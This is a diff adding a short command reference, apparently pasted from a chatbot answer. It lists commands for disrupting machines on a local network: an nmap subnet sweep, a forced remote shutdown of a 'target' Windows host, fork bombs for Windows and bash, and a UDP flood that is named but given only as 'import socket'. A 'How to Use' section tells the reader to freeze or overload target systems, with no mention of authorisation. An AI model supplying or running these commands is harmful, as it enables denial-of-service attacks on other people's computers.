@@ -1,0 +1,32 @@
+commands_reference.txt
+A text file that provides detailed explanations of all the commands used, including context for Windows, Kali Linux, and macOS.
+
+text
+Copy
+Edit
+# commands_reference.txt
+
+## 1. Scan LAN (Kali Linux/macOS)
+nmap -sn 192.168.1.0/24
+- Scans the subnet (192.168.1.0/24) to find all devices connected to the network.
+
+## 2. Shutdown Target (Windows)
+shutdown /s /f /t 0 /m \\192.168.1.5
+- Shuts down the target machine with IP `192.168.1.5` immediately.
+
+## 3. Fork Bomb (Windows)
+%0|%0
+- Creates an infinite loop, which consumes system resources and causes the computer to freeze.
+
+## 4. Fork Bomb (Linux/macOS)
+:(){ :|:& };:
+- A fork bomb in bash that overloads system processes, causing the computer to freeze.
+
+## 5. UDP Flood (Python)
+import socket
+- Python script that sends a massive number of UDP packets to the target machine, potentially overloading it.
+
+## How to Use:
+- For Kali: Open a terminal and run `bash scan_lan.sh` to discover devices on your local network.
+- For Windows: Execute `shutdown_target.cmd` or `freeze.bat` to freeze the target system (on the same LAN).
+- For Linux/macOS: Run `bash forkbomb.sh` to trigger a freeze, or use the UDP flood Python script to overload a device.
